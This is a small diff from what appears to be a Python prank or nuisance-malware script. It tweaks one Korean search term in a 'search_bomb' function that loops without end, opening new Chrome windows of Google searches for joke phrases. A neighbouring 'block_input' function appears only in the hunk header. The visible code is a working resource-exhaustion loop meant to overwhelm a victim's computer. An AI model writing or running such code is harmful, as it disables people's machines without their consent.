@@ -19,7 +19,7 @@ def block_input():
         except: pass
 
 def search_bomb():
-    search_terms = ["컴퓨터 바이러스 없애는 법", "마인크래프트 무료 설치", "마이크로소프트를 훔치는 법", "Visual Studio 2020에서 Python으로 바이러스 만드는 법", "학교 때려치는 법", "Pepe the frog", "아 배고프다", "헤헤헤헿ㅎㅎㅎㅎ"]
+    search_terms = ["컴퓨터 바이러스 없애는 법", "마인크래프트 무료 설치", "마이크로소프트를 훔치는 법", "Visual Studio 2020에서 Python으로 바이러스 만드는 법", "학교 때려치는 법", "Pepe the frog", "아 배고프다", "헤헤헤헿ㅎㅎㅎ"]
     while True:
         term = random.choice(search_terms)
         subprocess.Popen([CHROME_PATH, "--new-window", f"https://www.google.com/search?q={term}"])
